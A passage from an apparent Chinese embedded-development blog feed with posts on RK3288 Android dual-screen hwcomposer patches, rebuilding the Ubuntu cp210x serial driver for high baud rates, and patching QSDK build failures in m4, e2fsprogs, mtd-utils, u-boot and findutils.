set_hdmi_info(struct rk_screen *screen); </code></pre><p>驱rk3288-ubuntu1404-backup-20210618-rootfs.img动部分花费时间最长，调试许久才成功，驱动调好后，两个屏幕就可以同时显示了，主屏一切正常，但是副屏会花屏。</p><h2 id="android-system"><a href="#android-system" class="headerlink" title="android system"></a>android system</h2><p>为了解决花屏的问题，继续探索，然后看到这篇文章：<a href="https://www.cnblogs.com/lialong1st/p/9149213.html">RK3288 增加双屏异显 eDP+LVDS</a></p><p>这篇文章是在 <code>android 5.1</code> 基础上支持双屏异显，可以参考下，最后发现 <code>5.1 </code> 和 <code>6.0</code> 的 framework 部分差异较大，无法使用文章中的 <code>patch</code>, 索性不加了，但是其它部分改动不大，引入后重新编译系统，居然可以正常启动了，花屏问题也不存在了。下面给出Android系统层面的改动。</p><h3 id="device-hwcomposer"><a href="#device-hwcomposer" class="headerlink" title="device hwcomposer"></a>device hwcomposer</h3><ul><li><code>hardware/rockchip/hwcomposer</code></li></ul><pre><code class="c">diff --git a/rk_hwcomposer.cpp b/rk_hwcomposer.cppindex d36b4b8..2266fcb 100755--- a/rk_hwcomposer.cpp+++ b/rk_hwcomposer.cpp@@ -79,6 +79,7 @@ static int  hwc_free_buffer(buffer_handle_t hnd);  int         hwc_sprite_replace(hwcContext * Context, hwc_display_contents_1_t * list); void*       hwc_control_3dmode_thread(void *arg);+int         hwc_parse_screen_info(int *outX, int *outY);  void*   hotplug_try_register(void *arg); void    hotplug_get_resolution(int* w,int* h);@@ -11917,6 +11918,10 @@ int hotplug_get_config(int flag)&#123;     int outX = 0;     int outY = 0;     hotplug_parse_mode(&amp;outX, &amp;outY);+    if (hwc_get_int_property(&quot;ro.htg.force&quot;, &quot;0&quot;))+        hwc_parse_screen_info(&amp;outX, &amp;outY);+    else+        hotplug_parse_mode(&amp;outX, &amp;outY);     info.xres = outX;     info.yres = outY;     info.yres_virtual = info.yres * 3;@@ -12242,6 +12247,29 @@ OnError:  &#125; +int hwc_parse_screen_info(int *outX, int *outY)+&#123;+    char buf[100];+    int width = 0;+    int height = 0;+    int fdExternal = -1;+    fdExternal = open(&quot;/sys/class/graphics/fb4/screen_info&quot;, O_RDONLY);+    if(fdExternal &lt; 0)&#123;+        ALOGE(&quot;hotplug_get_config:open fb screen_info error,cvbsfd=%d&quot;,fdExternal);+        return -errno;+    &#125;+    if(read(fdExternal,buf,sizeof(buf)) &lt; 0)&#123;+        ALOGE(&quot;error reading fb screen_info: %s&quot;, strerror(errno));+        return -1;+    &#125;+    close(fdExternal);+    sscanf(buf,&quot;xres:%d yres:%d&quot;,&amp;width,&amp;height);+    ALOGD(&quot;hotplug_get_config:width=%d,height=%d&quot;,width,height);+    *outX = width;+    *outY = height;+    return 0;+&#125;+ int hotplug_parse_mode(int *outX, int *outY) &#123;    int fd = open(&quot;/sys/class/display/HDMI/mode&quot;, O_RDONLY);@@ -12428,7 +12456,12 @@ void *hotplug_try_register(void *arg)     if(getHdmiMode() == 1)&#123;         handle_hotplug_event(1, 6);         ALOGI(&quot;hotplug_try_register at line = %d&quot;,__LINE__);-    &#125;else&#123;+    &#125; else if (hwc_get_int_property(&quot;ro.htg.force&quot;, &quot;0&quot;)) &#123;+        hotplug_free_dimbuffer();+        hotplug_get_config(0);+        handle_hotplug_event(1, 6);+        ALOGI(&quot;hotplug_try_register at line = %d&quot;,__LINE__);+    &#125; else &#123; #if (defined(RK3368_BOX) || defined(RK3288_BOX) || defined(RK3399_BOX)) #if RK3288_BOX         if(context-&gt;mLcdcNum == 1)&#123;</code></pre><p><code>/sys/class/graphics/fb0</code> 对应主屏， <code>/sys/class/graphics/fb4</code> 对应副屏。</p><h3 id="system-prop"><a href="#system-prop" class="headerlink" title="system.prop"></a>system.prop</h3><ul><li><code>device/rockchip/rk3288/system.prop</code></li></ul><pre><code class="c">diff --git a/system.prop b/system.propindex d3534f3..0938841 100644--- a/system.prop+++ b/system.prop@@ -12,6 +12,7 @@ wifi.interface=wlan0 #rild.libargs=-d /dev/ttyACM0 persist.tegra.nvmmlite = 1 ro.audio.monitorOrientation=true+ro.htg.force=1  #NFC debug.nfc.fw_download=false</code></pre><h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><h3 id="scrcpy"><a href="#scrcpy" class="headerlink" title="scrcpy"></a>scrcpy</h3><p>安装 <code>scrcpy</code> 方便在电脑上操作Android 设备. </p><pre><code class="bash">snap install scrcpy</code></pre><h3 id="issues"><a href="#issues" class="headerlink" title="issues"></a>issues</h3><p>当 dts 中的显示器参数设置不当时，会出现以下异常。</p><pre><code class="bash">root@rk3288:/ # dmesg |grep -i edp                                             [    0.871339] Use EDP as primary screen[    0.871461] rk32-edp rk32-edp: failed to get reset[    0.871474] rk32-edp rk32-edp: failed to get reset[    0.871615] rk32-edp rk32-edp: rk32 edp driver probe success[    0.894143] rk32-edp rk32-edp: edp pll locked[    0.951750] rk32-edp rk32-edp: max link rate:0.0Gps max number of lanes:0[    0.951765] rk32-edp rk32-edp: Rx Mx Link Rate is abnormal:0!default link rate:1.62Gps[    0.951777] rk32-edp rk32-edp: Rx Max Lane count is abnormal :0 !use default lanes:4[    0.957711] rk32-edp rk32-edp: hw lt err:1[    0.957722] rk32-edp rk32-edp: link train failed!</code></pre><p>这是 <code>GPIO</code> 接口配置错误情况下会出现的，当然是在排除硬件故障情况下。    </p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul><li><a href="https://www.t-firefly.com/doc/case/348.html">firefly Android双屏异显</a></li><li><a href="https://blog.csdn.net/MrDongShiYi/article/details/90903796">RK3288[android 7.1]调试笔记 ----双屏异显（edp屏做主屏，lvds做副屏）</a></li><li><a href="https://blog.csdn.net/kris_fei/article/details/78646966">[RK3288][Android6.0] 调试笔记 --- 双屏显示内核Patch</a></li><li><a href="https://www.cnblogs.com/lialong1st/p/9149213.html">RK3288 增加双屏异显 eDP+LVDS</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android </tag>
            
            <tag> rk3288 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Ubuntu 18.04 minicom 不支持 1500000 波特率的问题</title>
      <link href="2021/05/28/cp210x/"/>
      <url>2021/05/28/cp210x/</url>
      
        <content type="html"><![CDATA[<p>最近使用 <code>Ubuntu 18.04</code> 作为台式机的办公系统，需要使用串口调试功能，于是安装了 <code>minicom</code>, 但是配置波特率的时候发现无法配置高于 <code>1000000</code> 以上波特率。</p><pre><code class="bash">$ sudo stty -F /dev/ttyUSB0 1500000stty: /dev/ttyUSB0: unable to perform all requested operations</code></pre><span id="more"></span><p>谷歌了许久也没找到方法，只能自己探索下了。</p><h2 id="问题排查"><a href="#问题排查" class="headerlink" title="问题排查"></a>问题排查</h2><p>为此，我测试了以下几种情况：</p><ol><li>在笔记本 win10 上可以正常配置，排除串口线和串口工具问题</li><li>在笔记本 ubuntu 16.04 上可以正常配置</li><li>在台式机的 win10 系统上可以，排查台式机USB接口问题</li><li>在台式机的 ubuntu 16.04 虚拟机上正常配置，说明与 ubuntu 18.04 系统有关</li><li>在台式机的 ubuntu 18.04 上使用ch341驱动，可以正常配置，说明是 <code>cp210x</code> 驱动问题</li></ol><p>最终确定是 <code>ubuntu 18.04</code> 的 <code>cp210x</code> 驱动不支持高波特率的配置，这里涉及到两个因素：</p><ol><li>ubuntu 版本号 <code>18.04</code></li><li><code>cp210x</code> 驱动</li></ol><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>那么怎么解决呢，总不可能重装个 <code>ubuntu 16.04</code> 的系统吧，所以我首先想到的是替换驱动。把 <code>ubuntu 18.04</code> 的驱动替换为 <code>16.04</code> 的驱动，但是失败了。</p><pre><code class="bash">$ sudo insmod cp210x.koinsmod: ERROR: could not insert module cp210x.ko: Invalid module format</code></pre><p>提示格式无效，搜索发现 <code>insmod</code> 会比对内核模块的版本号。所以直接替换是不可行的，那就只能重新编译新的 <code>.ko</code> 文件。</p><p>先把 <code>ubuntu 16.04</code> 所在内核版本的 <code>cp210x.c</code> 源码下载下来，可以从 <a href="https://elixir.bootlin.com/linux/v4.15/source/drivers/usb/serial/cp210x.c">这里</a> 下载。</p><p>然后编写Makefile, 与 <code>cp210x.c</code> 放在同一个目录。</p><pre><code class="bash">serial├── cp210x.c└── Makefile</code></pre><pre><code class="Makefile">obj-m += cp210x.oKDIR := /lib/modules/`uname -r`/buildPWD:=`pwd`all:        make -C $(KDIR) M=$(PWD) modulesclean:        rm -f *.ko *.o *.symvers *.cmd *.cmd.o</code></pre><p>执行 <code>make</code> 就编译好了。</p><pre><code class="bash">$ makemake -C /lib/modules/`uname -r`/build M=`pwd` modulesmake[1]: Entering directory &#39;/usr/src/linux-headers-5.4.0-73-generic&#39;  CC [M]  /home/litreily/workspace/serial/cp210x.o  Building modules, stage 2.  MODPOST 1 modules  CC [M]  /home/litreily/workspace/serial/cp210x.mod.o  LD [M]  /home/litreily/workspace/serial/cp210x.komake[1]: Leaving directory &#39;/usr/src/linux-headers-5.4.0-73-generic&#39;$ lscp210x.c  cp210x.ko  cp210x.mod     cp210x.mod.c   cp210x.mod.o  cp210x.o  Makefile   modules.order  Module.symvers</code></pre><p>然后替换掉原有的 <code>.ko</code> 文件，最好把旧的备份下， 以防万一。</p><pre><code class="bash">sudo cp /lib/modules/`uname -r`/kernel/drivers/usb/serial/cp210x.ko cp210x.ko.backupsudo cp cp210x.ko /lib/modules/`uname -r`/kernel/drivers/usb/serial/cp210x.ko</code></pre><p>最后，重新加载 <code>cp210x.ko</code>, 执行前先拔掉所以串口线。</p><pre><code class="bash">sudo rmmod cp210xsudo insmod cp210x</code></pre><p>正常加载完成就说明成功了。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>最后来测试下，修改波特率为1500000.</p><pre><code class="bash">$ sudo stty -F /dev/ttyUSB0 1500000$ sudo stty -F /dev/ttyUSB1 speed 1500000 baud; line = 0;-brkint -imaxbel</code></pre><p>大功告成！有兴趣的可以去对比下驱动源码，看看为啥 <code>5.4.0</code> 的内核为啥不支持高波特率的配置。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul><li><a href="https://www.huaweicloud.com/articles/c485d53fc9d703af400d5ad6215c06d8.html">https://www.huaweicloud.com/articles/c485d53fc9d703af400d5ad6215c06d8.html</a></li><li><a href="https://elixir.bootlin.com/linux/v4.15/source/drivers/usb/serial/cp210x.c">linux 4.15 cp210x.c</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> usb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于 IPQ807x 编译 QSDK</title>
      <link href="2021/02/07/qsdk-compile/"/>
      <url>2021/02/07/qsdk-compile/</url>
      
        <content type="html"><![CDATA[<p>接上一篇 <a href="https://www.litreily.top/2021/01/29/qsdk/">下载安装基于 openwrt 的 QSDK</a>,  这一篇来讲下编译 <code>QSDK</code> 的步骤以及遇到的问题及其处理方法。</p><p>正常步骤，是下面这样的，根据设备类型选择 config 文件，生成 .config, 然后完整编译。</p><pre><code class="bash">cp qca/configs/qsdk/ipq_open.config .configecho  CONFIG_TARGET_ipq_ipq807x_64=y  &gt;&gt; .configecho CONFIG_TARGET_ipq_ipq807x_64_QSDK_Open=y  &gt;&gt; .configmake package/symlinksmake defconfigmake V=s</code></pre><p><code>make V=s</code> 之前的指令都能正常通过，但是编译过程中就可能出现各种情况，比如缺少编译工具等。</p><h2 id="依赖工具"><a href="#依赖工具" class="headerlink" title="依赖工具"></a>依赖工具</h2><p>每个人的编译环境可能都不一样，所以缺少的依赖也不同，这里给出我的环境（ubuntu 20.04）缺少的工具</p><ul><li><code>ocaml-nox</code>: Objective Caml compiler for GUI of <code>make menuconfig</code></li><li><code>zlib1g-dev</code>: for <code>zlib</code></li><li><code>libssl-dev</code>: for <code>openssl</code></li><li><code>subversion</code>: for <code>svn</code></li></ul><p>安装如下：</p><pre><code class="bash">sudo apt install ocaml-noxsudo apt install zlib1g-devsudo apt install libssl-devsudo apt install subversion</code></pre><h2 id="编译错误"><a href="#编译错误" class="headerlink" title="编译错误"></a>编译错误</h2><h3 id="m4"><a href="#m4" class="headerlink" title="m4"></a>m4</h3><p>在编译过程中，m4 编译失败，报错信息如下：</p><pre><code class="log">gcc  -I.   -I/home/litreily/qsdk/qsdk/staging_dir/host/include -I/home/litreily/qsdk/qsdk/staging_dir/host/usr/include  -O2 -I/home/litreily/qsdk/qsdk/staging_dir/host/include -I/home/litreily/qsdk/qsdk/staging_dir/host/usr/include -MT freadahead.o -MD -MP -MF $depbase.Tpo -c -o freadahead.o freadahead.c &amp;&amp;\mv -f $depbase.Tpo $depbase.Pofreadahead.c: In function &#39;freadahead&#39;:freadahead.c:91:3: error: #error &quot;Please port gnulib freadahead.c to your platform! Look at the definition of fflush, fread, ungetc on your system, then report this to bug-gnulib.&quot;   91 |  #error &quot;Please port gnulib freadahead.c to your platform! Look at the definition of fflush, fread, ungetc on your system, then report this to bug-gnulib.&quot;      |   ^~~~~make[6]: *** [Makefile:1837: freadahead.o] Error 1make[6]: Leaving directory &#39;/home/litreily/qsdk/qsdk/build_dir/host/m4-1.4.17/lib&#39;make[5]: *** [Makefile:1602: all] Error 2</code></pre><p>关键信息是 <code>#error &quot;Please port gnulib freadahead.c to your platform&quot;</code>.</p><p>解决方案是打补丁，参考 <a href="https://www.reddit.com/r/archlinux/comments/97gsb1/glibc_update_breaks_buildroot/">glibc update breaks buildroot</a> 给出的方案，从 GitHub 寻找到了 <a href="https://github.com/coreutils/gnulib/commit/4af4a4a71827c0bc5e0ec67af23edef4f15cee8e">patch</a>.</p><blockquote><p>从 <code>GitHub</code> 上下载指定 <code>commit</code> 对应的 patch 时，只需要在 commit url 后面添加 <code>.patch</code> 后缀即可。</p></blockquote><p>下载后放到目录 <code>tools/m4/patches/</code>. 然后重新执行 <code>make V=s</code>, 或者 <code>make tools/m4/compile V=s</code>, 你会发现，之前的错误信息不见了，但是会出现其它错误，指示我们新加入的 <code>patch</code> 添加失败。这是为什么呢？因为 GitHub 的 patch 对应的 m4 的版本和 <code>QSDK</code> 中的不一样，所以需要对patch稍加修改，把不存在的文件部分删除即可。</p><p>裁剪后的 patch 如下：</p><pre><code class="patch">diff --git a/lib/fflush.c b/lib/fflush.cindex 983ade0ff..a6edfa105 100644--- a/lib/fflush.c+++ b/lib/fflush.c@@ -33,7 +33,7 @@ #undef fflush-#if defined _IO_ftrylockfile || __GNU_LIBRARY__ == 1 /* GNU libc, BeOS, Haiku, Linux libc5 */+#if defined _IO_EOF_SEEN || __GNU_LIBRARY__ == 1 /* GNU libc, BeOS, Haiku, Linux libc5 */ /* Clear the stream&#39;s ungetc buffer, preserving the value of ftello (fp).  */ static void@@ -72,7 +72,7 @@ clear_ungetc_buffer (FILE *fp) #endif-#if ! (defined _IO_ftrylockfile || __GNU_LIBRARY__ == 1 /* GNU libc, BeOS, Haiku, Linux libc5 */)+#if ! (defined _IO_EOF_SEEN || __GNU_LIBRARY__ == 1 /* GNU libc, BeOS, Haiku, Linux libc5 */) # if (defined __sferror || defined __DragonFly__ || defined __ANDROID__) &amp;&amp; defined __SNPT /* FreeBSD, NetBSD, OpenBSD, DragonFly, Mac OS X, Cygwin, Minix 3, Android */@@ -148,7 +148,7 @@ rpl_fflush (FILE *stream)   if (stream == NULL || ! freading (stream))     return fflush (stream);-#if defined _IO_ftrylockfile || __GNU_LIBRARY__ == 1 /* GNU libc, BeOS, Haiku, Linux libc5 */+#if defined _IO_EOF_SEEN || __GNU_LIBRARY__ == 1 /* GNU libc, BeOS, Haiku, Linux libc5 */   clear_ungetc_buffer_preserving_position (stream);diff --git a/lib/fpurge.c b/lib/fpurge.cindex b1d417c7a..3aedcc373 100644--- a/lib/fpurge.c+++ b/lib/fpurge.c@@ -62,7 +62,7 @@ fpurge (FILE *fp)   /* Most systems provide FILE as a struct and the necessary bitmask in      &lt;stdio.h&gt;, because they need it for implementing getc() and putc() as      fast macros.  */-# if defined _IO_ftrylockfile || __GNU_LIBRARY__ == 1 /* GNU libc, BeOS, Haiku, Linux libc5 */+# if defined _IO_EOF_SEEN || __GNU_LIBRARY__ == 1 /* GNU libc, BeOS, Haiku, Linux libc5 */   fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;   fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_base;   /* Avoid memory leak when there is an active ungetc buffer.  */diff --git a/lib/freadahead.c b/lib/freadahead.cindex c2ecb5b28..23ec76ee5 100644--- a/lib/freadahead.c+++ b/lib/freadahead.c@@ -30,7 +30,7 @@ extern size_t __sreadahead (FILE *); size_t freadahead (FILE *fp) &#123;-#if defined _IO_ftrylockfile || __GNU_LIBRARY__ == 1 /* GNU libc, BeOS, Haiku, Linux libc5 */+#if defined _IO_EOF_SEEN || __GNU_LIBRARY__ == 1 /* GNU libc, BeOS, Haiku, Linux libc5 */   if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)     return 0;   return (fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr)diff --git a/lib/freading.c b/lib/freading.cindex 73c28acdd..c24d0c88a 100644--- a/lib/freading.c+++ b/lib/freading.c@@ -31,7 +31,7 @@ freading (FILE *fp)   /* Most systems provide FILE as a struct and the necessary bitmask in      &lt;stdio.h&gt;, because they need it for implementing getc() and putc() as      fast macros.  */-# if defined _IO_ftrylockfile || __GNU_LIBRARY__ == 1 /* GNU libc, BeOS, Haiku, Linux libc5 */+# if defined _IO_EOF_SEEN || __GNU_LIBRARY__ == 1 /* GNU libc, BeOS, Haiku, Linux libc5 */   return ((fp-&gt;_flags &amp; _IO_NO_WRITES) != 0           || ((fp-&gt;_flags &amp; (_IO_NO_READS | _IO_CURRENTLY_PUTTING)) == 0               &amp;&amp; fp-&gt;_IO_read_base != NULL));diff --git a/lib/fseeko.c b/lib/fseeko.cindex 0101ab55f..193f4e8ce 100644--- a/lib/fseeko.c+++ b/lib/fseeko.c@@ -47,7 +47,7 @@ fseeko (FILE *fp, off_t offset, int whence) #endif   /* These tests are based on fpurge.c.  */-#if defined _IO_ftrylockfile || __GNU_LIBRARY__ == 1 /* GNU libc, BeOS, Haiku, Linux libc5 */+#if defined _IO_EOF_SEEN || __GNU_LIBRARY__ == 1 /* GNU libc, BeOS, Haiku, Linux libc5 */   if (fp-&gt;_IO_read_end == fp-&gt;_IO_read_ptr       &amp;&amp; fp-&gt;_IO_write_ptr == fp-&gt;_IO_write_base       &amp;&amp; fp-&gt;_IO_save_base == NULL)@@ -123,7 +123,7 @@ fseeko (FILE *fp, off_t offset, int whence)           return -1;         &#125; -#if defined _IO_ftrylockfile || __GNU_LIBRARY__ == 1 /* GNU libc, BeOS, Haiku, Linux libc5 */+#if defined _IO_EOF_SEEN || __GNU_LIBRARY__ == 1 /* GNU libc, BeOS, Haiku, Linux libc5 */       fp-&gt;_flags &amp;= ~_IO_EOF_SEEN;       fp-&gt;_offset = pos; #elif defined __sferror || defined __DragonFly__ || defined __ANDROID__--- a/lib/stdio-impl.h+++ b/lib/stdio-impl.h@@ -18,6 +18,12 @@    the same implementation of stdio extension API, except that some fields    have different naming conventions, or their access requires some casts.  */   +/* Glibc 2.28 made _IO_IN_BACKUP private.  For now, work around this+   problem by defining it ourselves.  FIXME: Do not rely on glibc+   internals.  */+#if !defined _IO_IN_BACKUP &amp;&amp; defined _IO_EOF_SEEN+# define _IO_IN_BACKUP 0x100+#endif   /* BSD stdio derived implementations.  */ </code></pre><p>这个 patch 最主要的修改就是将 <code>_IO_ftrylockfile</code> 改成了 <code>_IO_EOF_SEEN</code>, 具体原因没有深究，有知道的可以留言分享下~</p><p>ok, 将这个patch加入后，<code>m4</code> 就能正常编译过去了。接着 <code>make V=s</code> 编译整个项目吧。</p><h3 id="make-ext4fs"><a href="#make-ext4fs" class="headerlink" title="make-ext4fs"></a>make-ext4fs</h3><p><code>make-ext4fs</code> 编译失败的信息如下：</p><pre><code class="log">cc -o make_ext4fs allocate.o canned_fs_config.o contents.o crc16.o ext4fixup.o ext4_sb.o ext4_utils.o extent.o indirect.o make_ext4fs_main.o make_ext4fs.o sha1.o uuid.o wipe.o libsparse/libsparse.a -lz/usr/bin/ld: contents.o: in function `make_special&#39;:contents.c:(.text+0xbf7): undefined reference to `major&#39;/usr/bin/ld: contents.c:(.text+0xc17): undefined reference to `minor&#39;collect2: error: ld returned 1 exit statusmake[3]: *** [Makefile:24: make_ext4fs] Error 1</code></pre><p>参考 <a href="https://github.com/hishamhm/htop/issues/663">github issue</a> 可知，这是缺少头文件 <code>&lt;sys/sysmacros.h&gt;</code> 导致的。</p><p>加如 patch 0001-fix-undefined-reference-major-minor.patch，放到目录 <code>tools/make-ext4fs/patches/</code>。</p><pre><code class="patch">--- a/contents.c        2021-02-07 15:37:31.463251930 +0800+++ b/contents.c        2021-02-07 15:37:03.022743240 +0800@@ -15,6 +15,7 @@  */  #include &lt;sys/stat.h&gt;+#include &lt;sys/sysmacros.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; </code></pre><p><code>make tools/make-ext4fs/&#123;clean,compile&#125; V=s</code> 编译成功！</p><h3 id="e2fsprogs"><a href="#e2fsprogs" class="headerlink" title="e2fsprogs"></a>e2fsprogs</h3><p><code>e2fsprogs</code> 的编译错误与 <code>make-ext4fs</code> 类似，其错误信息如下：</p><pre><code class="log">/usr/bin/ld: ../lib/libblkid.a(devname.o): in function `probe_all&#39;:devname.c:(.text+0x888): undefined reference to `makedev&#39;/usr/bin/ld: devname.c:(.text+0xb7e): undefined reference to `makedev&#39;/usr/bin/ld: devname.c:(.text+0xc5b): undefined reference to `makedev&#39;collect2: error: ld returned 1 exit statusmake[6]: *** [Makefile:391: e2fsck] Error 1make[6]: Leaving directory &#39;/home/litreily/qsdk/qsdk/build_dir/host/e2fsprogs-1.42.8/e2fsck&#39;make[5]: *** [Makefile:355: all-progs-recursive] Error 1</code></pre><p><code>makedev</code> 也属于头文件 <code>&lt;sys/sysmacros.h&gt;</code>, 添加 patch 到目录 <code>tools/e2fsprogs/patches</code>：</p><pre><code class="patch">--- a/lib/blkid/devname.c 2021-02-07 16:04:24.190214251 +0800+++ b/lib/blkid/devname.c 2021-02-07 16:03:53.869128549 +0800@@ -37,6 +37,7 @@ #include &lt;sys/mkdev.h&gt; #endif #include &lt;time.h&gt;+#include &lt;sys/sysmacros.h&gt;  #include &quot;blkidP.h&quot;</code></pre><p><code>make tools/e2fsprogs/&#123;clean,compile&#125; V=s</code> 编译成功!</p><h3 id="mtd-utils"><a href="#mtd-utils" class="headerlink" title="mtd-utils"></a>mtd-utils</h3><p>与 <code>make-ext4fs</code>, <code>e2fsprogs</code> 类似，也是缺少 <code>sysmacros.h</code></p><pre><code class="log">/usr/bin/ld: /home/litreily/qsdk/qsdk/build_dir/host/mtd-utils-1.5.1/mkfs.jffs2.o: in function `write_special_file&#39;:/home/litreily/qsdk/qsdk/build_dir/host/mtd-utils-1.5.1/mkfs.jffs2.c:944: undefined reference to `major&#39;/usr/bin/ld: /home/litreily/qsdk/qsdk/build_dir/host/mtd-utils-1.5.1/mkfs.jffs2.c:944: undefined reference to `minor&#39;/usr/bin/ld: /home/litreily/qsdk/qsdk/build_dir/host/mtd-utils-1.5.1/mkfs.jffs2.o: in function `recursive_populate_directory&#39;:/home/litreily/qsdk/qsdk/build_dir/host/mtd-utils-1.5.1/mkfs.jffs2.c:1273: undefined reference to `minor&#39;/usr/bin/ld: /home/litreily/qsdk/qsdk/build_dir/host/mtd-utils-1.5.1/mkfs.jffs2.c:1273: undefined reference to `major&#39;/usr/bin/ld: /home/litreily/qsdk/qsdk/build_dir/host/mtd-utils-1.5.1/mkfs.jffs2.c:1263: undefined reference to `minor&#39;/usr/bin/ld: /home/litreily/qsdk/qsdk/build_dir/host/mtd-utils-1.5.1/mkfs.jffs2.c:1263: undefined reference to `major&#39;/usr/bin/ld: /home/litreily/qsdk/qsdk/build_dir/host/mtd-utils-1.5.1/mkfs.jffs2.o: in function `interpret_table_entry&#39;:/home/litreily/qsdk/qsdk/build_dir/host/mtd-utils-1.5.1/mkfs.jffs2.c:467: undefined reference to `makedev&#39;/usr/bin/ld: /home/litreily/qsdk/qsdk/build_dir/host/mtd-utils-1.5.1/mkfs.jffs2.c:503: undefined reference to `makedev&#39;/usr/bin/ld: /home/litreily/qsdk/qsdk/build_dir/host/mtd-utils-1.5.1/mkfs.jffs2.c:510: undefined reference to `makedev&#39;collect2: error: ld returned 1 exit statusmake[4]: *** [common.mk:71: /home/litreily/qsdk/qsdk/build_dir/host/mtd-utils-1.5.1/mkfs.jffs2] Error 1</code></pre><p>添加 patch 到目录 <code>tools/mtd-utils/patches</code>.</p><pre><code class="patch">--- a/include/common.h  2021-02-07 16:25:50.643801767 +0800+++ b/include/common.h  2021-02-07 16:25:41.139803836 +0800@@ -19,6 +19,7 @@ #ifndef __MTD_UTILS_COMMON_H__ #define __MTD_UTILS_COMMON_H__ +#include &lt;sys/sysmacros.h&gt; #include &lt;stdbool.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;</code></pre><p><code>make tools/mtd-utils/&#123;clean,compile&#125; V=s</code> 编译成功！</p><blockquote><p>这里注意下，如果在 <code>mkfs.jffs2.c</code> 中添加这个头文件的话，还会有其它文件报错，也是缺少头文件，所以方便起见，将该头文件放入共有的共用的 <code>common.h</code></p></blockquote><h3 id="u-boot"><a href="#u-boot" class="headerlink" title="u-boot"></a>u-boot</h3><p><code>u-boot</code> 编译失败。</p><pre><code class="log">/home/litreily/qsdk/qsdk/build_dir/host/u-boot-2014.10/lib/rsa/rsa-sign.c: In function &#39;rsa_get_exponent&#39;:/home/litreily/qsdk/qsdk/build_dir/host/u-boot-2014.10/lib/rsa/rsa-sign.c:279:21: error: dereferencing pointer to incomplete type &#39;RSA&#39; &#123;aka &#39;struct rsa_st&#39;&#125;  279 |  if (BN_num_bits(key-&gt;e) &gt; 64)      |                     ^~make[5]: *** [scripts/Makefile.host:134: tools/lib/rsa/rsa-sign.o] Error 1</code></pre><p>根据 <a href="https://github.com/freifunk-gluon/gluon/issues/973">github issue</a> 讨论，这是需要安装 <code>libssl1.0-dev</code>, 但是之前安装的是默认的 <code>libssl1.1</code>, 所以需要重新安装 1.0 版本。</p><p>但是 <code>ubuntu</code> 默认源并不包含 1.0 版本，参考 <a href="https://github.com/rvm/rvm/issues/4764">github - cannot install on Debian stable (libssl1.0-dev)</a>, 需要手动修改：</p><pre><code class="bash">sudo echo &quot;deb http://security.ubuntu.com/ubuntu bionic-security main&quot; &gt;&gt; /etc/apt/sources.listsudo apt updatesudo apt-cache policy libssl1.0-devsudo apt install libssl1.0-dev</code></pre><p>安装成功后，重新编译就正常了。</p><h3 id="findutils"><a href="#findutils" class="headerlink" title="findutils"></a>findutils</h3><p>编译错误与 <code>m4</code> 一致。</p><pre><code class="log">freadahead.c: In function &#39;freadahead&#39;:freadahead.c:64:3: error: #error &quot;Please port gnulib freadahead.c to your platform! Look at the definition of fflush, fread on your system, then report this to bug-gnulib.&quot;   64 |  #error &quot;Please port gnulib freadahead.c to your platform! Look at the definition of fflush, fread on your system, then report this to bug-gnulib.&quot;      |   ^~~~~make[8]: *** [Makefile:890: freadahead.o] Error 1</code></pre><p>需要注意的是，虽然报错信息一样，但 patch 却和 <code>m4</code> 并不通用，因为其所用的 gnulib 库版本不一致。这种情况下，有两种选择</p><ol><li>单独 fix 编译错误</li><li>升级 findutils, 4.4.2 -&gt; 4.6.0</li></ol><p>为了保持版本不变，选择第一种方式，先看下报错 log 对应 code：</p><pre><code class="c">size_tfreadahead (FILE *fp)&#123;#if defined _IO_ferror_unlocked     /* GNU libc, BeOS */  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)    return 0;  return fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;#elif defined __sferror             /* FreeBSD, NetBSD, OpenBSD, MacOS X, Cygwin */  if ((fp-&gt;_flags &amp; __SWR) != 0 || fp-&gt;_r &lt; 0)    return 0;  return fp-&gt;_r;#elif defined _IOERR                /* AIX, HP-UX, IRIX, OSF/1, Solaris, mingw */# if defined __sun &amp;&amp; defined _LP64 /* Solaris/&#123;SPARC,AMD64&#125; 64-bit */#  define fp_ ((struct &#123; unsigned char *_ptr; \                         unsigned char *_base; \                         unsigned char *_end; \                         long _cnt; \                         int _file; \                         unsigned int _flag; \                       &#125; *) fp)  if ((fp_-&gt;_flag &amp; _IOWRT) != 0)    return 0;  return fp_-&gt;_cnt;# else  if ((fp-&gt;_flag &amp; _IOWRT) != 0)    return 0;  return fp-&gt;_cnt;# endif#elif defined __UCLIBC__            /* uClibc */# ifdef __STDIO_BUFFERS  if (fp-&gt;__modeflags &amp; __FLAG_WRITING)    return 0;  return fp-&gt;__bufread - fp-&gt;__bufpos;# else  return 0;# endif#elif defined __QNX__               /* QNX */  if ((fp-&gt;_Mode &amp; 0x2000 /* _MWRITE */) != 0)    return 0;  /* fp-&gt;_Buf &lt;= fp-&gt;_Next &lt;= fp-&gt;_Rend */  return fp-&gt;_Rend - fp-&gt;_Next;#else #error &quot;Please port gnulib freadahead.c to your platform! Look at the definition of fflush, fread on your system, then report this to bug-gnulib.&quot;#endif&#125;</code></pre><p>可以看出报错的原因是某些宏定义没有定义。与此类似的文件有：</p><ul><li>fseeko.c</li><li>fpurge.c</li><li>freading.c</li><li>freadahead.c</li></ul><p>统一处理下，把最后的 <code>#else</code> 分支内容注释掉，然后添加相应的 <code>return 